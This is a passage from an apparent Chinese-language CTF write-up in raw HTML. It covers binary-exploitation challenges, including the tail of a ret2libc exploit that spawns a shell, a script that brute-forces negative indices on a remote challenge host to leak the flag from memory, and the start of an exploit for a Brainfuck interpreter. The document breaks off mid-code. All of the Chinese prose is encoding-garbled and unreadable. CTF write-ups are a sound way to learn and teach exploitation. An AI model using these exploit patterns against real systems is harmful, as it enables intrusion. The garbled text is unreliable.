style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">What is your name, fierce warrior? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h2 id="charful" class="scroll-target"><a href="#charful"><code class="hash inline-code">#</code>charful</a></h2>
<p>é¢˜ç›®ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€ï¼Œé‡Œé¢æœ‰ main.c, todos.c, todos.hï¼Œç»™äº†æºä»£ç  makefile dockerfileï¼Œç„¶åå†ä¸‹è½½å‡ºé¢˜äººæçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> file</span><span style="color:#B56959"> todos_arm</span><br><span style="color:#59873A">todos_arm:</span><span style="color:#B56959"> ELF</span><span style="color:#B56959"> 32-bit</span><span style="color:#B56959"> LSB</span><span style="color:#B56959"> executable,</span><span style="color:#B56959"> ARM,</span><span style="color:#B56959"> EABI5</span><span style="color:#B56959"> version</span><span style="color:#2F798A"> 1</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">GNU/Linux</span><span style="color:#2993a3">)</span><span style="color:#393A34">, statically linked, </span><span style="color:#B07D48">BuildID</span><span style="color:#2993a3">[</span><span style="color:#B07D48">sha1</span><span style="color:#2993a3">]</span><span style="color:#999999">=</span><span style="color:#B56959">ea22cc12e1971e647ebf3c451feca3cbaf59c926,</span><span style="color:#59873A"> for</span><span style="color:#B56959"> GNU/Linux</span><span style="color:#B56959"> 3.2.0,</span><span style="color:#B56959"> not</span><span style="color:#B56959"> stripped</span><br></code></pre></div>
<p>ok 32 ä½ armï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºé¢˜äººä¼šç»™ä¸€ä¸ªå¤ç°ä¸äº†çš„ dockerfile å‡ºæ¥ï¼Ÿç»™è¿™ä¸ª dockerfile çš„æ„ä¹‰æ˜¯ï¼Ÿæˆ‘ç”¨ä»–çš„ dockerfile build å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ˜¯è¿™æ ·ï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> file</span><span style="color:#B56959"> todos</span><br><span style="color:#59873A">todos:</span><span style="color:#B56959"> ELF</span><span style="color:#B56959"> 64-bit</span><span style="color:#B56959"> LSB</span><span style="color:#B56959"> executable,</span><span style="color:#B56959"> x86-64,</span><span style="color:#B56959"> version</span><span style="color:#2F798A"> 1</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">GNU/Linux</span><span style="color:#2993a3">)</span><span style="color:#393A34">, statically linked, </span><span style="color:#B07D48">BuildID</span><span style="color:#2993a3">[</span><span style="color:#B07D48">sha1</span><span style="color:#2993a3">]</span><span style="color:#999999">=</span><span style="color:#B56959">84f666f27998b6edf31415eb4079223c150c9c28,</span><span style="color:#59873A"> for</span><span style="color:#B56959"> GNU/Linux</span><span style="color:#B56959"> 3.2.0,</span><span style="color:#B56959"> not</span><span style="color:#B56959"> stripped</span><br></code></pre></div>
<p>åˆ°è¿™é‡Œå·²ç»åˆè§ç«¯å€ªäº†ï¼Œæ˜¯çš„ï¼Œå‡ºé¢˜äººä¸æ˜¯äººï¼Œæ²¡çœ‹å‡ºæ¥ä¹Ÿæ²¡å…³ç³»ï¼Œç»§ç»­åšã€‚</p>
<p><img src="https://pic1.imgdb.cn/item/6821604458cb8da5c8ecc5bc.png" alt="image.png"/></p>
<p>èœå•é¢˜ï¼Œé‚£æ„Ÿè§‰å¯èƒ½æ¯”è¾ƒå¤æ‚äº†ï¼Œä¼°è®¡å¾—é€ä¸ªé€†å‘</p>
<p>é¢˜ç›®æç¤ºè¯´è¿™æ˜¯æ•´æ•°æº¢å‡ºâ€¦..çœ‹äº†ä¸€ä¼šï¼Œæ„Ÿè§‰æŒ‰ç…§é¢˜ç›®è¿™ä¸ªæ£€æŸ¥æ–¹æ³•ï¼Œåº”è¯¥ä¸å¯èƒ½æº¢å‡ºå•Šï¼Ÿï¼Ÿï¼Ÿåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæ‰¾ä¸åˆ°ğŸ•³</p>
<p><img src="https://pic1.imgdb.cn/item/6821606858cb8da5c8ecc5e9.png" alt="image.png"/></p>
<p>ï¼ˆæ€€ç–‘äººç”Ÿ.jpgï¼‰</p>
<p>éšä¾¿è¾“å…¥äº†ä¸€äº› fuzz ä¸€ä¸‹ï¼Œç»“æœå‡ºç°äº†éé¢„æœŸçš„è¾“å‡ºï¼Ÿæˆ‘è‰ï¼Ÿ</p>
<p>ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œåœ¨æºç é‡Œæ˜¯è¿™ä¹ˆå†™çš„ï¼š</p>
<p><img src="https://pic1.imgdb.cn/item/6821608b58cb8da5c8ecc5f1.png" alt="image.png"/></p>
<p>ida é€†å‘å‡ºæ¥æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://pic1.imgdb.cn/item/682160ac58cb8da5c8ecc609.png" alt="image.png"/></p>
<p>ï¼Ÿç»™çš„æºä»£ç å’Œå¯æ‰§è¡Œæ–‡ä»¶ä¸ä¸€æ ·ï¼Œç»™æºä»£ç çš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>åˆ°è¿™ä½ ä¼šè§‰å¾—å‡ºé¢˜äººç¡®å®ä¸å¤ªè¯—äººï¼Œåˆ«æ€¥ã€‚</p>
<p>åˆšæ‰è¯´äº†è¿™æ˜¯ä¸ªèœå•é¢˜ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŠŸèƒ½ï¼Œæƒ³äº†æƒ³ï¼Œä¼¼ä¹åªéœ€è¦ print_todo è¿™ä¸€ä¸ªåŠŸèƒ½å°±èƒ½æŠŠå†…å­˜é‡Œçš„ flag æ‰“å°å‡ºæ¥äº†å§ï¼Ÿ</p>
<p>ä¸å¤ªç¡®å®šï¼Œå†™ä¸ªè„šæœ¬çœ‹çœ‹ï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./todos_arm</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">charful.chals.damctf.xyz</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 30128</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x4019D5</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">What would you like to do? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Which TODO would you like to print? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">330</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">300</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> i </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"res => </span><span style="color:#1e754f">{</span><span style="color:#393A34">i</span><span style="color:#1e754f">}</span><span style="color:#B56959"> => </span><span style="color:#1e754f">{</span><span style="color:#393A34">res</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<p>ï¼Ÿ</p>
<p><img src="https://pic1.imgdb.cn/item/682160c258cb8da5c8ecc614.png" alt="image.png"/></p>
<p>ç›´æ¥å‡ºäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>ä¸æ˜¯å“¥ä»¬ï¼Ÿé‚£ä½ ä»–å¦ˆå†™é‚£ä¹ˆå¤šåŠŸèƒ½å¹²å˜›ï¼Ÿ</p>
<p>å“¦å¯¹ï¼Œä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡åªæ‰¾åˆ°äº†ä¸€åŠçš„ flag å‘¢ï¼Ÿå“ˆå“ˆï¼Œå› ä¸ºé¶æœºè¿œç¨‹å¤ªå¡äº†ï¼Œç¬¬ä¸€æ¬¡çˆ†åˆ°ä¸€åŠ dump äº†ï¼Œè¿˜å¥½æˆ‘è‡ªä¿¡ğŸ˜</p>
<p>ä»¥å daimi å†è®©æˆ‘åšè¿™ç§å‚»é€¼é¢˜æˆ‘å°±æŠŠ daimi æ€äº†ã€‚</p>
<h2 id="bf" class="scroll-target"><a href="#bf"><code class="hash inline-code">#</code>bf</a></h2>
<p>å­˜åœ¨æº¢å‡ºæ¼æ´ï¼Œç®€å•åˆ©ç”¨å³å¯</p>
<p>Zzz</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#A0ADA0"># >,    //è¯»å…¥ä¸€ä¸ªå­—ç¬¦nï¼Œä»£è¡¨æˆ‘ä»¬è¦è¾“å…¥å­—ç¬¦çš„ä¸ªæ•°</span><br><span style="color:#A0ADA0"># [</span><br><span style="color:#A0ADA0">#   [>] //å‘å³ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ª0å­—ç¬¦çš„ä½ç½®ï¼ˆå­—ç¬¦ä¸²å¤´</span><br><span style="color:#A0ADA0">#   ,   //è¾“å…¥å­—ç¬¦</span><br><span style="color:#A0ADA0">#   [&#x3C;] //å‘å·¦ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ª0å­—ç¬¦ä¸²ä½ç½®ï¼ˆå­—ç¬¦ä¸²å°¾</span><br><span style="color:#A0ADA0">#   >-  //å‘å³ç§»åŠ¨åˆ°nå¹¶å°†å…¶-1</span><br><span style="color:#A0ADA0"># ]     //è‹¥ä¸º0è·³å‡ºå¾ªç¯</span><br><br><span style="color:#A0ADA0"># -     //å‰©ä¸‹çš„we don't care</span><br><span style="color:#A0ADA0"># [>]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [&#x3C;.+]</span><br><span style="color:#A0ADA0"># ++++++++++.</span><br></code></pre></div>
<p>expï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">filename</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">./bf</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">sla </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34">s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sl </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sa </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34">s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">s </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p=process(filename)</span><br><span style="color:#A0ADA0"># e=ELF(filename)</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#393A34">ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">debug</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)</span><br><span style="color:#A0ADA0"># gdb.attach(p)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">:</span><span style="color:#998418"> str</span><span style="color:#999999">,</span><span style="color:#393A34"> output</span><span style="color:#AB5959">=</span><span style="color:#1E754F">None</span><span style="color:#999999">,</span><span style="color:#393A34"> start</span><span style="color:#AB5959">=</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> depth</span><span style="color:#AB5959">=</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> output </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">        output </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> *</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    sp </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><br><span style="color:#393A34">    loop_start </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><br><br><span style="color:#1E754F">    while</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> and</span><span style="color:#393A34"> code</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> !=</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">\0</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">        ch </span><span style="color:#999999">=</span><span style="color:#393A34"> code</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><br><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">&#x3C;</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 2</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">.</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 3</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">,</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 4</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">+</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 5</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">-</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 6</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">[</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 7</span><br><span style="color:#393A34">            jump_target </span><span style="color:#999999">=</span><span style="color:#393A34"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">,</span><span style="color:#393A34"> output</span><span style="color:#999999">,</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> depth </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> jump_target </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jump_target </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">=</span><span style="color:#393A34"> jump_target</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">]</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> depth </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">loop_start </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#393A34"> sp 